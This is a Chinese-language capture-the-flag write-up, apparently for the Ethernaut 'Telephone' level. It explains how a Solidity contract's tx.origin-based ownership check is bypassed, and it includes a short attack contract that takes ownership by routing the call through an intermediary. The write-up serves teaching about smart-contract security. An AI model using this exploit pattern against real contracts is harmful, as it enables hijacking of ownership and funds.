### 第五关 Telephone
### 难度1/5
## 这一关的通关条件是取得合约的所有权。
## 代码如下：
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
合约很简短，只有一个函数，函数名字也很直接叫“changeOwner”。观察可以发现，改变owner的条件是“tx.origin != msg.sender”。在 Solidity中，tx.origin 和 msg.sender 都是用于标识地址的全局变量，但它们的含义和用途有显著区别。
## msg.sender
表示当前调用智能合约的直接调用者的地址,可以是用户（外部账户）或另一个智能合约。例如，如果用户 A 调用合约 C 的函数，对于合约 C 来说，msg.sender就是 A 的地址；如果合约 B 调用合约 C，对于合约 C 来说，msg.sender就是合约 B 的地址。
## tx.origin
表示整个交易的原始发起者的地址。它是“最初触发交易的外部账户（EOA，Externally Owned Account）”的地址，无论中间经过多少层合约调用。例如，如果用户 A 调用合约 B，B 再调用合约 C，对于合约 B 和合约 C 来说，tx.origin都是外部账户 A。
## 解题步骤：
1. 打开remix线上编辑器,新建攻击合约：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract ChangeTelephone {

    address levelInstance;

    constructor(address _levelInstance) {
      levelInstance = _levelInstance;
    }

    function attack() public {
        ITelephone(levelInstance).changeOwner(tx.origin);

    }
}
```
2. 输入instance地址，部署合约，调用attack函数。
3. 提交过关。


